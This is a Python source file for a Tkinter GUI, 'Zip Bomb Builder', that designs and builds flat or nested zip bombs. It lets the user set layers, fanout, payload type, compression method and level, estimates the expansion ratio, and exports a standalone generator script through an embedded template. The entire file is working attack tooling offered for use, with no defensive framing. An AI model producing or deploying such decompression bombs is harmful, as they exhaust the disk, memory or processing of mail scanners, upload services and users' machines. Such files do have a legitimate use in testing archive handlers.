#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Zip Bomb Builder
================
A GUI tool to design and build zip bombs with full control over:
  - target unzip size (or base payload size)
  - recursive (nested) vs flat bombs, layers & fanout
  - payload content (zeros / random bytes / custom repeating text)
  - compression method (Deflate / Bzip2 / LZMA / Stored) and level
  - number of payload files, inner file name
  - estimation of bomb size and expansion ratio
  - export of a standalone build script

Standard library only. Python 3.8+ recommended.
"""

import os
import math
import queue
import shutil
import tempfile
import threading
import zipfile
import zlib
import bz2
import lzma

import tkinter as tk
from tkinter import ttk, filedialog, messagebox

CHUNK = 1024 * 1024  # 1 MiB

COMPRESSORS = {
    "Deflate": zipfile.ZIP_DEFLATED,
    "Bzip2": zipfile.ZIP_BZIP2,
    "LZMA": zipfile.ZIP_LZMA,
    "Stored": zipfile.ZIP_STORED,
}

UNITS = {"Bytes": 1, "KB": 1024, "MB": 1024 ** 2, "GB": 1024 ** 3, "TB": 1024 ** 4}

CONTENT_TYPES = {
    "Zeros (best compression)": "zeros",
    "Random bytes (worst compression)": "random",
    "Custom repeating text": "text",
}


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def human(n):
    n = float(n)
    for u in ("B", "KB", "MB", "GB", "TB", "PB", "EB"):
        if abs(n) < 1024.0:
            return f"{int(n):,} B" if u == "B" else f"{n:,.2f} {u}"
        n /= 1024.0
    return f"{n:,.2f} ZB"


def _zip_kwargs(method, level):
    comp = COMPRESSORS[method]
    kw = {"compression": comp}
    if comp in (zipfile.ZIP_DEFLATED, zipfile.ZIP_BZIP2) and level:
        kw["compresslevel"] = int(level)
    return kw


def content_chunks(total, kind, text=""):
    """Yield `total` bytes of payload material (in <=1 MiB chunks)."""
    if kind == "random":
        remaining = int(total)
        while remaining > 0:
            n = min(CHUNK, remaining)
            yield os.urandom(n)
            remaining -= n
    else:
        if kind == "zeros":
            unit = b"\x00" * CHUNK
        else:  # repeating text
            t = (text or "A").encode("utf-8", "ignore") or b"A"
            unit = (t * (math.ceil(CHUNK / len(t)) + 1))[:CHUNK]
        remaining = int(total)
        while remaining > 0:
            n = min(len(unit), remaining)
            yield unit[:n]
            remaining -= n


def _entry_sizes(total, entries):
    per = total // entries
    sizes = [per] * entries
    sizes[0] += total - per * entries
    return sizes


def _write_payload_zip(path, inner_name, size, kind, text, method, level,
                       entries, progress=None):
    """Write a zip containing `entries` payload files totalling `size` bytes."""
    written = 0
    last = [0.0]

    def tick():
        if progress is None:
            return
        frac = written / max(1, size)
        if frac - last[0] > 0.001 or frac >= 1.0:
            last[0] = frac
            progress(frac)

    with zipfile.ZipFile(path, "w", **_zip_kwargs(method, level)) as zf:
        for i, sz in enumerate(_entry_sizes(size, entries)):
            name = inner_name if entries == 1 else f"{inner_name}.{i:03d}"
            with zf.open(name, "w") as fh:
                for chunk in content_chunks(sz, kind, text):
                    fh.write(chunk)
                    written += len(chunk)
                    tick()
    if progress:
        progress(1.0)


# ---------------------------------------------------------------------------
# bomb builders (used by the GUI and mirrored in the generated script)
# ---------------------------------------------------------------------------

def build_flat(path, inner_name, size, kind, text, method, level, entries=1,
               progress=None, log=print):
    log(f"[flat] target {size:,} bytes in {entries} file(s), method={method} "
        f"level={level or 'default'}")
    _write_payload_zip(path, inner_name, size, kind, text, method, level,
                       entries, progress)
    log(f"[flat] finished: {os.path.getsize(path):,} bytes on disk")


def build_recursive(path, inner_name, base_size, kind, text, method, level,
                    layers, fanout, entries=1, progress=None, log=print):
    total = base_size * fanout ** layers
    log(f"[recursive] layers={layers}, fanout={fanout}, "
        f"base payload={base_size:,} bytes")
    log(f"[recursive] theoretical total extraction = {human(total)}")

    tmpdir = tempfile.mkdtemp(prefix="zipbomb_")
    try:
        prev = os.path.join(tmpdir, "layer0.zip")
        log(f"layer 0/{layers}: building base zip")
        half = (lambda frac: progress(frac * 0.5)) if progress else None
        _write_payload_zip(prev, inner_name, base_size, kind, text, method,
                           level, entries, half)

        for layer in range(1, layers + 1):
            last_layer = (layer == layers)
            dest = path if last_layer else os.path.join(tmpdir, f"layer{layer}.zip")
            prev_size = os.path.getsize(prev)
            log(f"layer {layer}/{layers}: packing {fanout} copies "
                f"of {prev_size:,} bytes")
            start = 0.5 + 0.5 * (layer - 1) / layers
            span = 0.5 / layers
            with zipfile.ZipFile(dest, "w", **_zip_kwargs(method, level)) as zf:
                for i in range(fanout):
                    with zf.open(f"copy_{i:04d}.zip", "w") as out:
                        with open(prev, "rb") as src:
                            while True:
                                b = src.read(CHUNK)
                                if not b:
                                    break
                                out.write(b)
                    if progress:
                        progress(start + span * (i + 1) / fanout)
            os.remove(prev)
            prev = dest
        log(f"[recursive] finished: {os.path.getsize(path):,} bytes on disk")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def _compress_sample(data, method, level):
    comp = COMPRESSORS[method]
    if comp == zipfile.ZIP_STORED:
        return data
    if comp == zipfile.ZIP_DEFLATED:
        c = zlib.compressobj(int(level) if level else 6)
        return c.compress(data) + c.flush()
    if comp == zipfile.ZIP_BZIP2:
        return bz2.compress(data, max(1, int(level) if level else 1))
    return lzma.compress(data)


def estimate(cfg):
    """Rough estimate of final bomb size and expansion ratio."""
    layers = cfg["layers"] if cfg["recursive"] else 0
    sample = b"".join(content_chunks(256 * 1024, cfg["kind"], cfg["text"]))
    data = sample
    ratios = []
    for _ in range(layers + 1):
        out = _compress_sample(data, cfg["method"], cfg["level"])
        ratios.append(len(data) / max(1, len(out)))
        data = out
        if len(data) < 1024:  # keep enough material for a meaningful test
            data = data * ((1024 // len(data)) + 1)

    base_compressed = cfg["base_size"] / max(1.0, ratios[0])
    if not cfg["recursive"]:
        total = cfg["base_size"]
        bomb = base_compressed
    else:
        f = cfg["fanout"]
        size = base_compressed
        for i in range(1, layers + 1):
            size = size * f / max(1.0, ratios[i])
        total = cfg["base_size"] * f ** layers
        bomb = size
    return total, bomb, total / max(bomb, 1e-9)


# ---------------------------------------------------------------------------
# standalone build-script template
# ---------------------------------------------------------------------------

SCRIPT_TEMPLATE = r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auto-generated by Zip Bomb Builder.
Run:  python __FILENAME__ [output_path]
"""
import os
import sys
import math
import shutil
import tempfile
import zipfile

CHUNK = 1024 * 1024

# ------------------------------ configuration ------------------------------
OUTPUT     = __OUT__
MODE       = "__MODE__"        # "flat" | "recursive"
INNER_NAME = "__INNER__"      # name of the innermost payload file(s)
CONTENT    = "__KIND__"       # "zeros" | "random" | "text"
TEXT       = __TEXT__         # used when CONTENT == "text"
METHOD     = "__METHOD__"     # Deflate | Bzip2 | LZMA | Stored
LEVEL      = __LEVEL__        # 1-9 (deflate/bzip2 only), 0 = default
BASE_SIZE  = __BASE__         # bytes of payload in the innermost layer
ENTRIES    = __ENTRIES__     # number of payload files (flat mode)
LAYERS     = __LAYERS__      # nesting depth (recursive mode)
FANOUT     = __FANOUT__      # copies per layer (recursive mode)

COMPRESSORS = {
    "Deflate": zipfile.ZIP_DEFLATED,
    "Bzip2": zipfile.ZIP_BZIP2,
    "LZMA": zipfile.ZIP_LZMA,
    "Stored": zipfile.ZIP_STORED,
}
# ---------------------------------------------------------------------------


def zip_kwargs():
    comp = COMPRESSORS[METHOD]
    kw = {"compression": comp}
    if comp in (zipfile.ZIP_DEFLATED, zipfile.ZIP_BZIP2) and LEVEL:
        kw["compresslevel"] = LEVEL
    return kw


def content_chunks(total, kind, text=""):
    if kind == "random":
        remaining = int(total)
        while remaining > 0:
            n = min(CHUNK, remaining)
            yield os.urandom(n)
            remaining -= n
    else:
        if kind == "zeros":
            unit = b"\x00" * CHUNK
        else:
            t = (text or "A").encode("utf-8", "ignore") or b"A"
            unit = (t * (math.ceil(CHUNK / len(t)) + 1))[:CHUNK]
        remaining = int(total)
        while remaining > 0:
            n = min(len(unit), remaining)
            yield unit[:n]
            remaining -= n


def entry_sizes(total, entries):
    per = total // entries
    sizes = [per] * entries
    sizes[0] += total - per * entries
    return sizes


def build_flat(path):
    print(f"[flat] target {BASE_SIZE:,} bytes in {ENTRIES} file(s), "
          f"method={METHOD} level={LEVEL or 'default'}")
    with zipfile.ZipFile(path, "w", **zip_kwargs()) as zf:
        for i, sz in enumerate(entry_sizes(BASE_SIZE, ENTRIES)):
            name = INNER_NAME if ENTRIES == 1 else f"{INNER_NAME}.{i:03d}"
            with zf.open(name, "w") as fh:
                for chunk in content_chunks(sz, CONTENT, TEXT):
                    fh.write(chunk)
        print()
    print(f"[flat] finished: {os.path.getsize(path):,} bytes")


def build_recursive(path):
    total = BASE_SIZE * FANOUT ** LAYERS
    print(f"[recursive] layers={LAYERS}, fanout={FANOUT}, "
          f"base={BASE_SIZE:,} bytes, total extraction={total:,} bytes")
    tmpdir = tempfile.mkdtemp(prefix="zipbomb_")
    try:
        prev = os.path.join(tmpdir, "layer0.zip")
        print(f"layer 0/{LAYERS}: building base zip")
        with zipfile.ZipFile(prev, "w", **zip_kwargs()) as zf:
            for i, sz in enumerate(entry_sizes(BASE_SIZE, ENTRIES)):
                name = INNER_NAME if ENTRIES == 1 else f"{INNER_NAME}.{i:03d}"
                with zf.open(name, "w") as fh:
                    for chunk in content_chunks(sz, CONTENT, TEXT):
                        fh.write(chunk)
        for layer in range(1, LAYERS + 1):
            last = layer == LAYERS
            dest = path if last else os.path.join(tmpdir, f"layer{layer}.zip")
            prev_size = os.path.getsize(prev)
            print(f"layer {layer}/{LAYERS}: packing {FANOUT} copies "
                  f"of {prev_size:,} bytes")
            with zipfile.ZipFile(dest, "w", **zip_kwargs()) as zf:
                for i in range(FANOUT):
                    with zf.open(f"copy_{i:04d}.zip", "w") as out:
                        with open(prev, "rb") as src:
                            while True:
                                b = src.read(CHUNK)
                                if not b:
                                    break
                                out.write(b)
                    print(f"  copy {i + 1}/{FANOUT}")
            os.remove(prev)
            prev = dest
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
    print(f"[recursive] finished: {os.path.getsize(path):,} bytes")


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else OUTPUT
    if MODE == "recursive":
        build_recursive(out)
    else:
        build_flat(out)
'''


# ---------------------------------------------------------------------------
# GUI
# ---------------------------------------------------------------------------

class ZipBombBuilder(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title("Zip Bomb Builder")
        self.geometry("760x780")
        self.minsize(700, 680)

        self.msg_q = queue.Queue()
        self.building = False
        self.action_buttons = []

        self._create_style()
        self._create_widgets()
        self._update_states()
        self._update_derived()

        self.protocol("WM_DELETE_WINDOW", self._on_close)
        self.after(80, self._poll_queue)

    # ---------------- UI construction ----------------

    def _create_style(self):
        style = ttk.Style(self)
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass
        style.configure("TLabelframe.Label", font=("TkDefaultFont", 10, "bold"))
        style.configure("Build.TButton", font=("TkDefaultFont", 10, "bold"),
                        padding=(18, 8))
        style.configure("TButton", padding=(6, 4))
        style.configure("TSpinbox", padding=2)

    def _create_widgets(self):
        outer = ttk.Frame(self, padding=12)
        outer.pack(fill="both", expand=True)
        outer.columnconfigure(0, weight=1)

        # header
        ttk.Label(outer, text="Zip Bomb Builder",
                  font=("TkDefaultFont", 16, "bold")).grid(row=0, column=0,
                                                           sticky="w")
        ttk.Label(outer, text="Design, estimate and build zip bombs — flat or "
                              "recursive (nested).",
                  foreground="#666").grid(row=1, column=0, sticky="w",
                                          pady=(0, 10))

        # output file
        out = ttk.Frame(outer)
        out.grid(row=2, column=0, sticky="ew", pady=(0, 8))
        out.columnconfigure(1, weight=1)
        ttk.Label(out, text="Output file:").grid(row=0, column=0, padx=(0, 6))
        self.out_var = tk.StringVar(value="bomb.zip")
        ttk.Entry(out, textvariable=self.out_var).grid(row=0, column=1,
                                                      sticky="ew")
        ttk.Button(out, text="Browse…",
                  command=self._browse_out).grid(row=0, column=2, padx=(6, 0))

        # ---- section 1: type & size ----
        f1 = ttk.LabelFrame(outer, text="1 · Bomb type & size", padding=10)
        f1.grid(row=3, column=0, sticky="ew", pady=4)
        for c in range(4):
            f1.columnconfigure(c, weight=0)
        f1.columnconfigure(3, weight=1)

        self.mode_var = tk.StringVar(value="flat")
        ttk.Radiobutton(f1, text="Flat (single zip)",
                        variable=self.mode_var, value="flat",
                        command=self._config_changed).grid(row=0, column=0,
                                                            sticky="w")
        ttk.Radiobutton(f1, text="Recursive (nested zips)",
                        variable=self.mode_var, value="recursive",
                        command=self._config_changed).grid(row=0, column=1,
                                                           sticky="w")

        self.layers_var = tk.IntVar(value=4)
        self.fanout_var = tk.IntVar(value=16)
        ttk.Label(f1, text="Layers:").grid(row=1, column=0, sticky="w",
                                           pady=(6, 0))
        self.layers_spin = ttk.Spinbox(f1, from_=1, to=10, width=5,
                                      textvariable=self.layers_var,
                                      command=self._config_changed)
        self.layers_spin.grid(row=1, column=1, sticky="w", pady=(6, 0))
        ttk.Label(f1, text="Fanout (copies per layer):").grid(
            row=1, column=2, sticky="e", pady=(6, 0), padx=(10, 4))
        self.fanout_spin = ttk.Spinbox(f1, from_=2, to=1000, width=6,
                                       textvariable=self.fanout_var,
                                       command=self._config_changed)
        self.fanout_spin.grid(row=1, column=3, sticky="w", pady=(6, 0))

        self.sizemode_var = tk.StringVar(value="target")
        self.size_label_var = tk.StringVar(value="Target unzip size "
                                                 "(fully extracted):")
        ttk.Label(f1, textvariable=self.size_label_var).grid(
            row=2, column=0, columnspan=2, sticky="w", pady=(8, 0))
        self.size_mode_rb1 = ttk.Radiobutton(
            f1, text="total size", variable=self.sizemode_var, value="target",
            command=self._config_changed)
        self.size_mode_rb2 = ttk.Radiobutton(
            f1, text="inner payload", variable=self.sizemode_var, value="base",
            command=self._config_changed)
        self.size_mode_rb1.grid(row=3, column=0, sticky="w")
        self.size_mode_rb2.grid(row=3, column=1, sticky="w")

        size_row = ttk.Frame(f1)
        size_row.grid(row=2, column=2, columnspan=2, sticky="ew",
                      pady=(8, 0))
        self.size_var = tk.StringVar(value="1")
        ttk.Entry(size_row, textvariable=self.size_var, width=14).pack(
            side="left")
        self.unit_var = tk.StringVar(value="GB")
        ttk.Combobox(size_row, textvariable=self.unit_var, state="readonly",
                     values=list(UNITS.keys()), width=6).pack(side="left",
                                                               padx=(4, 0))

        self.derived_var = tk.StringVar(value="—")
        ttk.Label(f1, textvariable=self.derived_var,
                 foreground="#0a6").grid(row=4, column=0, columnspan=4,
                                        sticky="w", pady=(8, 0))

        # ---- section 2: content ----
        f2 = ttk.LabelFrame(outer, text="2 · Payload content", padding=10)
        f2.grid(row=4, column=0, sticky="ew", pady=4)
        f2.columnconfigure(1, weight=1)

        ttk.Label(f2, text="Content:").grid(row=0, column=0, sticky="w")
        self.content_var = tk.StringVar(value="Zeros (best compression)")
        self.content_box = ttk.Combobox(f2, textvariable=self.content_var,
                                        state="readonly",
                                        values=list(CONTENT_TYPES.keys()))
        self.content_box.grid(row=0, column=1, sticky="ew", padx=(6, 0))
        self.content_box.bind("<<ComboboxSelected>>",
                            lambda e: self._config_changed())

        ttk.Label(f2, text="Custom text:").grid(row=1, column=0, sticky="w",
                                                pady=(6, 0))
        self.text_var = tk.StringVar(value="All work and no play makes Jack "
                                           "a dull boy. ")
        self.text_entry = ttk.Entry(f2, textvariable=self.text_var)
        self.text_entry.grid(row=1, column=1, sticky="ew", padx=(6, 0),
                             pady=(6, 0))

        ttk.Label(f2, text="Inner file name:").grid(row=2, column=0,
                                                    sticky="w", pady=(6, 0))
        self.inner_var = tk.StringVar(value="payload.bin")
        ttk.Entry(f2, textvariable=self.inner_var).grid(row=2, column=1,
                                                       sticky="ew", padx=(6, 0),
                                                       pady=(6, 0))

        ttk.Label(f2, text="Payload files (flat mode):").grid(
            row=3, column=0, sticky="w", pady=(6, 0))
        self.entries_var = tk.IntVar(value=1)
        self.entries_spin = ttk.Spinbox(f2, from_=1, to=1000, width=6,
                                        textvariable=self.entries_var,
                                        command=self._config_changed)
        self.entries_spin.grid(row=3, column=1, sticky="w", padx=(6, 0),
                               pady=(6, 0))

        # ---- section 3: compression ----
        f3 = ttk.LabelFrame(outer, text="3 · Compression", padding=10)
        f3.grid(row=5, column=0, sticky="ew", pady=4)
        f3.columnconfigure(1, weight=1)
        ttk.Label(f3, text="Method:").grid(row=0, column=0, sticky="w")
        self.method_var = tk.StringVar(value="Deflate")
        self.method_box = ttk.Combobox(f3, textvariable=self.method_var,
                                        state="readonly",
                                        values=list(COMPRESSORS.keys()))
        self.method_box.grid(row=0, column=1, sticky="ew", padx=(6, 0))
        self.method_box.bind("<<ComboboxSelected>>",
                           lambda e: self._config_changed())

        ttk.Label(f3, text="Level (Deflate/Bzip2):").grid(row=1, column=0,
                                                           sticky="w",
                                                           pady=(6, 0))
        self.level_var = tk.IntVar(value=9)
        self.level_spin = ttk.Spinbox(f3, from_=1, to=9, width=5,
                                      textvariable=self.level_var,
                                      command=self._config_changed)
        self.level_spin.grid(row=1, column=1, sticky="w", padx=(6, 0),
                             pady=(6, 0))

        # ---- section 4: estimate ----
        f4 = ttk.LabelFrame(outer, text="4 · Estimate", padding=10)
        f4.grid(row=6, column=0, sticky="ew", pady=4)
        f4.columnconfigure(0, weight=1)
        self.est_var = tk.StringVar(value="Press 'Estimate' to compute "
                                           "expected sizes.\n"
                                           "(Recursive estimates are "
                                           "approximations.)")
        ttk.Label(f4, textvariable=self.est_var, justify="left").grid(
            row=0, column=0, sticky="w")
        ttk.Button(f4, text="Estimate",
                  command=self._do_estimate).grid(row=0, column=1,
                                                  sticky="e")

        # ---- build bar ----
        bar = ttk.Frame(outer)
        bar.grid(row=7, column=0, sticky="ew", pady=(10, 4))
        bar.columnconfigure(1, weight=1)
        self.build_btn = ttk.Button(bar, text="BUILD BOMB",
                                   style="Build.TButton",
                                   command=self._start_build)
        self.build_btn.grid(row=0, column=0)
        self.prog = tk.DoubleVar(value=0.0)
        ttk.Progressbar(bar, variable=self.prog, maximum=100).grid(
            row=0, column=1, sticky="ew", padx=10)
        self.script_btn = ttk.Button(bar, text="Save build script (.py)",
                                     command=self._save_script)
        self.script_btn.grid(row=0, column=2)
        self.action_buttons = [self.build_btn, self.script_btn]

        # ---- log ----
        flog = ttk.LabelFrame(outer, text="Event log", padding=6)
        flog.grid(row=8, column=0, sticky="nsew", pady=4)
        outer.rowconfigure(8, weight=1)
        flog.columnconfigure(0, weight=1)
        flog.rowconfigure(0, weight=1)
        self.log = tk.Text(flog, height=10, state="disabled", wrap="word",
                           font=("Courier New", 9))
        self.log.grid(row=0, column=0, sticky="nsew")
        sb = ttk.Scrollbar(flog, command=self.log.yview)
        sb.grid(row=0, column=1, sticky="ns")
        self.log.configure(yscrollcommand=sb.set)

        # live updates
        for var in (self.size_var, self.unit_var, self.mode_var,
                    self.layers_var, self.fanout_var, self.sizemode_var,
                    self.entries_var):
            var.trace_add("write", lambda *a: self._config_changed())

    # ---------------- state / derived ----------------

    def _config_changed(self):
        self._update_states()
        self._update_derived()

    def _update_states(self):
        recursive = self.mode_var.get() == "recursive"
        st = "normal" if recursive else "disabled"
        for w in (self.layers_spin, self.fanout_spin,
                  self.size_mode_rb1, self.size_mode_rb2):
            w.configure(state=st)
        self.size_label_var.set(
            ("Target unzip size (fully extracted):"
             if self.sizemode_var.get() == "target"
             else "Base payload size (innermost layer):"))
        self.entries_spin.configure(state="normal" if not recursive
                                   else "disabled")
        self.level_spin.configure(
            state="normal" if self.method_var.get() in ("Deflate", "Bzip2")
            else "disabled")
        self.text_entry.configure(
            state="normal" if self.content_var.get() == "Custom repeating text"
            else "disabled")

    def _update_derived(self):
        try:
            cfg = self.collect_cfg()
        except Exception:
            self.derived_var.set("—")
            return
        if cfg["recursive"]:
            self.derived_var.set(
                f"Base payload: {human(cfg['base_size'])}    |    "
                f"Total unzip size: {human(cfg['total'])}    |    "
                f"expansion layers: {cfg['fanout']}^{cfg['layers']} = "
                f"{cfg['fanout'] ** cfg['layers']:,}×")
        else:
            self.derived_var.set(
                f"Total unzip size: {human(cfg['total'])} "
                f"({cfg['entries']} file(s))")

    # ---------------- config handling ----------------

    def collect_cfg(self):
        out = self.out_var.get().strip()
        if not out:
            raise ValueError("Please choose an output file.")
        if not out.lower().endswith(".zip"):
            out += ".zip"

        try:
            amount = float(self.size_var.get().strip().replace(",", ""))
        except ValueError:
            raise ValueError("Invalid size value.")
        factor = UNITS[self.unit_var.get()]
        value = int(amount * factor)
        if value <= 0:
            raise ValueError("Size must be positive.")

        recursive = self.mode_var.get() == "recursive"
        layers = int(self.layers_var.get()) if recursive else 0
        fanout = int(self.fanout_var.get()) if recursive else 1

        if recursive:
            if not (1 <= layers <= 10):
                raise ValueError("Layers must be between 1 and 10.")
            if not (2 <= fanout <= 1000):
                raise ValueError("Fanout must be between 2 and 1000.")

        if self.sizemode_var.get() == "target" or not recursive:
            base = value // (fanout ** layers) if recursive else value
            if recursive and base < 1:
                raise ValueError("Target size too small for the chosen "
                                "layers/fanout combination.")
        else:
            base = value

        total = base * (fanout ** layers)

        entries = max(1, int(self.entries_var.get()))
        if not recursive and entries > 1 and base // entries < 1:
            raise ValueError("Too many payload files for this size.")

        kind = CONTENT_TYPES[self.content_var.get()]
        text = self.text_var.get() if kind == "text" else ""
        method = self.method_var.get()
        level = int(self.level_var.get()) if method in ("Deflate", "Bzip2") \
            else None
        inner = self.inner_var.get().strip() or "payload.bin"

        return dict(out=out, recursive=recursive, layers=layers,
                    fanout=fanout, base_size=base, total=total,
                    entries=entries, kind=kind, text=text, method=method,
                    level=level, inner=inner)

    # ---------------- actions ----------------

    def _browse_out(self):
        p = filedialog.asksaveasfilename(
            defaultextension=".zip", filetypes=[("Zip files", "*.zip"),
                                                ("All files", "*.*")],
            initialfile="bomb.zip")
        if p:
            self.out_var.set(p)

    def _do_estimate(self):
        try:
            cfg = self.collect_cfg()
        except ValueError as e:
            messagebox.showerror("Invalid configuration", str(e), parent=self)
            return
        total, bomb, ratio = estimate(cfg)
        note = ""
        if ratio < 1.1:
            note = "\n⚠ This content barely compresses with this method!"
        self.est_var.set(
            f"Estimated bomb size on disk ≈ {human(bomb)}\n"
            f"Total unzip size = {human(total)}\n"
            f"Expansion ratio ≈ 1 : {ratio:,.0f}{note}")

    def _start_build(self):
        if self.building:
            return
        try:
            cfg = self.collect_cfg()
        except ValueError as e:
            messagebox.showerror("Invalid configuration", str(e), parent=self)
            return
        if os.path.exists(cfg["out"]):
            if not messagebox.askyesno(
                    "Overwrite?", f"'{cfg['out']}' already exists.\n"
                                  f"Overwrite it?", parent=self):
                return

        self.building = True
        for b in self.action_buttons:
            b.configure(state="disabled")
        self.prog.set(0.0)
        self._append_log("=" * 60 + "\n")
        threading.Thread(target=self._worker, args=(cfg,), daemon=True).start()

    def _worker(self, cfg):
        q = self.msg_q
        log = lambda m: q.put(("log", m))
        prog = lambda f: q.put(("prog", f))
        try:
            if cfg["recursive"]:
                build_recursive(cfg["out"], cfg["inner"], cfg["base_size"],
                                cfg["kind"], cfg["text"], cfg["method"],
                                cfg["level"], cfg["layers"], cfg["fanout"],
                                cfg["entries"], prog, log)
            else:
                build_flat(cfg["out"], cfg["inner"], cfg["base_size"],
                           cfg["kind"], cfg["text"], cfg["method"],
                           cfg["level"], cfg["entries"], prog, log)
            q.put(("done", cfg))
        except Exception as e:
            q.put(("error", repr(e)))

    def _save_script(self):
        try:
            cfg = self.collect_cfg()
        except ValueError as e:
            messagebox.showerror("Invalid configuration", str(e), parent=self)
            return
        p = filedialog.asksaveasfilename(
            defaultextension=".py", initialfile="make_bomb.py",
            filetypes=[("Python scripts", "*.py")], parent=self)
        if not p:
            return
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(generate_script_text(cfg, os.path.basename(p)))
        self._append_log(f"build script saved -> {p}\n")
        messagebox.showinfo("Saved", f"Standalone build script saved to:\n{p}",
                            parent=self)

    # ---------------- build lifecycle ----------------

    def _poll_queue(self):
        try:
            while True:
                kind, val = self.msg_q.get_nowait()
                if kind == "log":
                    self._append_log(val + "\n")
                    self.log.see("end")
                elif kind == "prog":
                    self.prog.set(min(100.0, val * 100.0))
                elif kind == "done":
                    self._finish_build(val)
                elif kind == "error":
                    self._fail_build(val)
        except queue.Empty:
            pass
        self.after(80, self._poll_queue)

    def _finish_build(self, cfg):
        self.building = False
        for b in self.action_buttons:
            b.configure(state="normal")
        self.prog.set(100.0)
        size = os.path.getsize(cfg["out"])
        ratio = cfg["total"] / max(1, size)
        self._append_log(f"SUCCESS: {cfg['out']} ({size:,} bytes), "
                         f"expansion 1:{ratio:,.0f}\n")
        extra = ("\n\nNote: recursive bombs need to be extracted "
                 "recursively (keep unzipping the inner .zip files to "
                 "reach full size)." if cfg["recursive"] else "")
        messagebox.showinfo(
            "Bomb built",
            f"File: {cfg['out']}\n"
            f"Bomb size: {human(size)}\n"
            f"Total unzip size: {human(cfg['total'])}\n"
            f"Expansion ratio: 1 : {ratio:,.0f}{extra}", parent=self)

    def _fail_build(self, err):
        self.building = False
        for b in self.action_buttons:
            b.configure(state="normal")
        self._append_log(f"ERROR: {err}\n")
        messagebox.showerror("Build failed", err, parent=self)

    # ---------------- misc ----------------

    def _append_log(self, text):
        self.log.configure(state="normal")
        self.log.insert("end", text)
        self.log.see("end")
        self.log.configure(state="disabled")

    def _on_close(self):
        if self.building:
            if not messagebox.askyesno(
                    "Build in progress",
                    "A build is still running.\nQuit anyway (the output "
                    "file may be incomplete)?", parent=self):
                return
        self.destroy()


def generate_script_text(cfg, filename="make_bomb.py"):
    tpl = SCRIPT_TEMPLATE
    reps = {
        "__FILENAME__": filename,
        "__OUT__": repr(cfg["out"]),
        "__MODE__": "recursive" if cfg["recursive"] else "flat",
        "__INNER__": cfg["inner"],
        "__KIND__": cfg["kind"],
        "__TEXT__": repr(cfg["text"] or ""),
        "__METHOD__": cfg["method"],
        "__LEVEL__": str(cfg["level"] or 0),
        "__BASE__": str(cfg["base_size"]),
        "__ENTRIES__": str(cfg["entries"]),
        "__LAYERS__": str(max(1, cfg["layers"])),
        "__FANOUT__": str(max(1, cfg["fanout"])),
    }
    for k, v in reps.items():
        tpl = tpl.replace(k, v)
    return tpl


def main():
    app = ZipBombBuilder()
    app.mainloop()


if __name__ == "__main__":
    main()
